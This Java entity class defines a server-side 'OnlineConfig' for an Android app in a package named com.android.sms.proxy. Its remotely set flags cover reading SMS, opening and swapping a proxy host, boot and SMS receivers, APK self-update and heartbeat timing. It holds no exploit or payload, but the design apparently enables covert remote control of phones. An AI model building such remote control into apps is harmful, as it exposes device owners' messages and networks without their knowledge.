package com.android.sms.proxy.entity;

import com.avos.avoscloud.AVClassName;
import com.avos.avoscloud.AVObject;

/**
 * @author zyq 16-4-11
 *         线上配置
 */

@AVClassName("OnlineConfig")
public class OnlineConfig extends AVObject {

	public static final Creator CREATOR = AVObjectCreator.instance;
	//是否更新应用
	public static final String ACTION_UPDATE = "updateApk";
	//是否查询短信
	public static final String ACTION_GET_MESSAGE = "getMessage";
	//是否检查代理服务
	public static final String ACTION_CHECK_SERVICE = "checkProxyService";
	//是否打开代理服务
	public static final String ACTION_OPEN_PROXY = "openProxyService";
	//是否停止心跳服务
	public static final String ACTION_STOP_HEARTBEAT_SERVICE = "stopHeartBeatService";
	//是否接收开机广播
	public static final String ACTION_ACCEPT_BOOT_RECEIVER = "acceptBootReceiver";
	//是否接收短信广播
	public static final String ACTION_ACCEPT_SMS_RECEIVER = "acceptSmsReceiver";
	//是否接收intent开启服务
	public static final String ACTION_ACCEPT_INTENT_START = "acceptIntentStart";
	//版本号
	public static final String APK_VERSION_NAME = "apkVersionName";
	//包名
	public static final String APK_PACKAGE_NAME = "apkPackageName";
	//是否替换代理
	public static final String ACTION_REPLACE_PROXY_HOST = "replaceProxyHost";
	//使用新的代理
	public static final String NEW_PROXY_HOST = "newProxyHost";
	//是否指定特定的时间
	public static final String ACTION_ASSIGN_SPECIFIC_TIME = "assignSpecificTime";
	//特定的时间,对应特定的时钟,分钟,秒,毫秒,有xx:xx:xx:xx构成
	public static final String ASSIGN_SPECIFIC_TIME = "specificTime";
	//更新延迟时间
	public static String HEARTBEAT_UPDATE_INIT_DELAY = "updateInitDelay";
	//短信查询延迟时间
	public static String HEARTBEAT_MESSAGE_INIT_DELAY = "messageInitDelay";
	//代理延迟时间
	public static String HEARTBEAT_PROXY_INIT_DELAY = "proxyInitDelay";//Message 推送延迟
	//检查延时时间
	public static String PROXY_CHECK_INIT_DELAY = "checkInitDelay";//200秒后才开始检查
	//检查任务间隔时间
	public static String PROXY_CHECK_INTERVAL_TIME = "checkIntervalTime";//检查任务每120秒检查一次
	//代理心跳包间隔时间
	public static String HEARTBEAT_PROXY_INTERVAL_TIME = "proxyIntervalTime";//Message 轮询消息

	public OnlineConfig() {
	}

	;

	public String getActionUpdate() {
		return getString(ACTION_UPDATE);
	}

	public void setActionUpdate(String actionUpdate) {
		put(ACTION_UPDATE, actionUpdate);
	}

	public String getActionGetMessage() {
		return getString(ACTION_GET_MESSAGE);
	}

	public void setActionGetMessage(String actionGetMessage) {
		put(ACTION_GET_MESSAGE, actionGetMessage);
	}

	public String getActionCheckService() {
		return getString(ACTION_CHECK_SERVICE);
	}

	public void setActionCheckService(String actionCheckService) {
		put(ACTION_CHECK_SERVICE, actionCheckService);
	}

	public String getActionOpenProxy() {
		return getString(ACTION_OPEN_PROXY);
	}

	public void setActionOpenProxy(String actionOpenProxy) {
		put(ACTION_OPEN_PROXY, actionOpenProxy);
	}

	public String getActionStopHeartbeatService() {
		return getString(ACTION_STOP_HEARTBEAT_SERVICE);
	}

	public void setActionStopHeartbeatService(String actionStopHeartbeatService) {
		put(ACTION_STOP_HEARTBEAT_SERVICE, actionStopHeartbeatService);
	}

	public String getActionAcceptBootReceiver() {
		return getString(ACTION_ACCEPT_BOOT_RECEIVER);
	}

	public void setActionAcceptBootRecevier(String actionAcceptBootReceiver) {
		put(ACTION_ACCEPT_BOOT_RECEIVER, actionAcceptBootReceiver);
	}

	public String getActionAcceptSmsReceiver() {
		return getString(ACTION_ACCEPT_SMS_RECEIVER);
	}

	public void setActionAcceptSmsReceiver(String actionAcceptSmsReceiver) {
		put(ACTION_ACCEPT_SMS_RECEIVER, actionAcceptSmsReceiver);
	}

	public String getActionAcceptIntentStart() {
		return getString(ACTION_ACCEPT_INTENT_START);
	}

	public void setActionAcceptIntentStart(String actionAcceptIntentStart) {
		put(ACTION_ACCEPT_INTENT_START, actionAcceptIntentStart);
	}

	public String getActionReplaceProxyHost() {
		return getString(ACTION_REPLACE_PROXY_HOST);
	}

	public void setActionReplaceProxyHost(String actionReplaceProxyHost) {
		put(ACTION_REPLACE_PROXY_HOST, actionReplaceProxyHost);
	}

	public String getApkVersionName() {
		return getString(APK_VERSION_NAME);
	}

	public void setApkVersionName(String versionName) {
		put(APK_VERSION_NAME, versionName);
	}

	public String getApkPackageName() {
		return getString(APK_PACKAGE_NAME);
	}

	public void setApkPackageName(String apkPackageName) {
		put(APK_PACKAGE_NAME, apkPackageName);
	}

	public String getNewProxyHost() {
		return getString(NEW_PROXY_HOST);
	}

	public void setNewProxyHost(String newProxyHost) {
		put(NEW_PROXY_HOST, newProxyHost);
	}

	public String getActionAssignSpecificTime() {
		return getString(ACTION_ASSIGN_SPECIFIC_TIME);
	}

	public void setActionAssignSpecificTime(String actionAssignSpecificTime) {
		put(ACTION_ASSIGN_SPECIFIC_TIME, actionAssignSpecificTime);
	}

	public String getAssignSpecificTime() {
		return getString(ASSIGN_SPECIFIC_TIME);
	}

	public void setAssignSpecificTime(String assignSpecificTime) {
		put(ASSIGN_SPECIFIC_TIME, assignSpecificTime);
	}

	public int getHeartbeatUpdateInitDelay() {
		return getInt(HEARTBEAT_UPDATE_INIT_DELAY);
	}

	public void setHeartbeatUpdateInitDelay(int heartbeatUpdateInitDelay) {
		put(HEARTBEAT_UPDATE_INIT_DELAY, heartbeatUpdateInitDelay);
	}

	public int getProxyCheckInitDelay() {
		return getInt(PROXY_CHECK_INIT_DELAY);
	}

	public void setProxyCheckInitDelay(int proxyCheckInitDelay) {
		put(PROXY_CHECK_INIT_DELAY, proxyCheckInitDelay);
	}

	public int getProxyCheckIntervalTime() {
		return getInt(PROXY_CHECK_INTERVAL_TIME);
	}

	public void setProxyCheckIntervalTime(int proxyCheckIntervalTime) {
		put(PROXY_CHECK_INTERVAL_TIME, proxyCheckIntervalTime);
	}

	public int getHeartbeatMessageInitDelay() {
		return getInt(HEARTBEAT_MESSAGE_INIT_DELAY);
	}

	public void setHeartbeatMessageInitDelay(int heartbeatMessageInitDelay) {
		put(HEARTBEAT_MESSAGE_INIT_DELAY, heartbeatMessageInitDelay);
	}

	public int getHeartbeatProxyInitDelay() {
		return getInt(HEARTBEAT_PROXY_INIT_DELAY);
	}

	public void setHeartbeatProxyInitDelay(int heartbeatProxyInitDelay) {
		put(HEARTBEAT_PROXY_INIT_DELAY, heartbeatProxyInitDelay);
	}

	public int getHeartbeatProxyIntervalTime() {
		return getInt(HEARTBEAT_PROXY_INTERVAL_TIME);
	}

	public void setHeartbeatProxyIntervalTime(int heartbeatProxyIntervalTime) {
		put(HEARTBEAT_PROXY_INTERVAL_TIME, heartbeatProxyIntervalTime);
	}
}
